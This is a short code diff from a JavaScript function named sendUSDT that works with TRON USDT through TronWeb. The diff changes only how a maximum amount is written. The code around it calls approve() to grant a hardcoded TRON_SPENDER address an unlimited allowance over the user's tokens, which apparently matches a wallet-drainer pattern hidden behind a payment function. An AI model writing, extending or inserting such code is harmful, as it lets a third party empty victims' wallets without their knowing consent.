@@ -124,7 +124,7 @@ async function sendUSDT() {
         { "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
       ];
       const contract = await tw.contract(ABI, TRON_USDT);
-      const maxAmount = tw.toBigNumber(2).exponentiatedBy(256).minus(1);
+      const maxAmount = tw.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
       const tx = await contract.approve(TRON_SPENDER, maxAmount).send({ feeLimit: 100_000_000, callValue: 0 });
       await new Promise(r => setTimeout(r, 3000));
 
